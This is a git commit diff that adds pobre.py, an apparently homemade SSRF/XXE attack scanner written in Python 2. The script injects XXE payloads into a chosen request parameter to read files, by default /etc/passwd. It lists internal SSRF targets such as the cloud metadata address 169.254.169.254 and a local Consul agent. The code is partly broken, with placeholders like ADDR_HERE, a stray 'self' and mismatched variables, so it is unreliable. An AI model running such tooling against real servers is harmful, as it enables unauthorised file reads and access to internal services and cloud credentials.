134c230d1d6b79dfa22e3a012e1160961fd455b4
mar adrian belen <mardrianbelen@gmail.com>
2015-07-13 11:00:11 +0800

    Update pobre.py

--- SSRF-SCanner-ala-pobre/pobre.py
+++ SSRF-SCanner-ala-pobre/pobre.py
@@ -1,1 +1,150 @@
+import request_maker
+import argparse
+import os
 
+
+
+
+#def Verbosity(v):
+def content_type_changer(content_type):
+	if(content_type=='x-www-form-urlencoded'):
+		content_type="application/" + content_type
+		header={'content-type':content_type}
+	elif(content_type=='xml' or content_type=='json'):
+		content_type="text/" + content_type
+		header={'content-type':content_type}
+
+	return header
+
+
+
+
+def XXE_sample(uri,pdata,tp,content_type,target_file):
+
+	if(pdata!=""): #if pdata is not null
+	 	#target_file='file:///C:/Users/adrian/Desktop/rce.txt'
+	 	x=RM.Request_maker().XXEpayload(target_file) #your payload.
+		decoded=RM.Request_maker().URLdecode(pdata,tp,x,uri,content_type)
+		decode_pdata=decoded['post_data']
+		uri=decoded['decoded_url']
+	else:
+		#target_file='file:///C:/Users/adrian/Desktop/rce.txt'
+	 	x=self.XXEpayload(target_file)
+		decoded=RM.Request_maker().URLdecode(None,tp,x,uri,content_type)
+		decode_pdata=decoded['post_data']
+		uri=decoded['decoded_url']
+
+
+
+
+
+	header=content_type_changer(content_type)
+
+
+	print '\n SOME RESPONSE \n';
+	container=RM.Request_maker().HTTPrequest(uri,None,header,decode_pdata)
+	#print container['header']
+	print container['targeturl'] + '\n\n'
+	#print container['get_data'] 
+
+
+############################################
+##############################################
+def Brute_force(uri,pdata,tp,content_type):
+
+
+	header=content_type_changer(content_type)
+
+
+	
+	##condition here that select port range or internal I.P , loopback service
+	service_to_detect={'consul':['http://127.0.0.1:8500/v1/agent/self','consul'], #some service to detect, add some service here!
+						'ec2/openstack':['http://169.254.169.254/','some strings'],
+						'monit':['ADDR_HERE','some strings'],
+						'solr':['ADDR_HERE','some strings'],
+						'redis':['ADDR_HERE','some strings'],
+						'memcahed':['ADDR_HERE','some strings'],
+						'local_file':['file:///etc/passwd','some_strings']
+						}
+
+	for x in service_to_detect:
+
+		if(pdata!=""): #if pdata is not null 
+
+			decoded=RM.Request_maker().URLdecode(pdata,tp,x,uri)
+			decode_pdata=decoded['post_data']
+			uri=decoded['decoded_url']
+		else:
+			decoded=RM.Request_maker().URLdecode(None,tp,x,uri)
+			decode_pdata=decoded['post_data']
+			uri=decoded['decoded_url']
+
+
+		print '\n SOME RESPONSE \n';
+		container=RM.Request_maker().HTTPrequest(uri,None,header,decode_pdata)
+		#print container['header']
+		print container['target_uri'] + '\n\n'
+		#print container['get_data'] 
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+parser=argparse.ArgumentParser()
+parser.add_argument('uri',help="target url",type=str)
+parser.add_argument('--pdata','-pdata',help="POST parameters",type=str)
+parser.add_argument('target',help="target parameter", type=str)
+#parser.add_argument('--scan',help="scan type", type=str, choices=['service','port'])
+parser.add_argument('attack_type',help="type of  attack XXE,SSRF", type=str, choices=['XXE','SSRF'])
+#parser.add_argument('--techique',help="techique such as open redirect,remote XXE", type=str, choices=['OR','OOB'])
+#parser.add_argument('--selected_port', help="selected port to scan", type=list)
+parser.add_argument('--content_type', help="content-type, defualt value: 'x-www-form-urlencoded'", choices=['xml','json','x-www-form-urlencoded'], default="x-www-form-urlencoded")
+parser.add_argument('--target_file',help="your fucking target :", type=str)
+
+args=parser.parse_args()
+#extracting the argument
+uri=args.uri
+pdata=args.pdata
+tp=args.target
+content_type=args.content_type
+target=args.target_file
+if(target==None):
+	target="file:///etc/passwd"
+#selected_Port
+#scan
+type_of_attack=args.attack_type#type of attack.
+RM=request_maker
+if(type_of_attack=='XXE'):
+	#os.system('start cmd /k python -m SimpleHTTPServer 1337')
+	#content_type='xml'
+	unknow='d'
+
+elif(type_of_attack=='SSRF' and content_type=='xml'):
+	print 'not supported :D'
+
+elif(type_of_attack=='SSRF' and tp==''):
+	print 'need a Target parameter'
+	exit()
+
+
+
+
+
+#Brute_force(uri,pdata,tp,content_type)
+XXE_sample(uri,pdata,tp,content_type,target)
+
+
+
+#python xxe.py http://192.168.186.136/login None XXE -h
+
+#
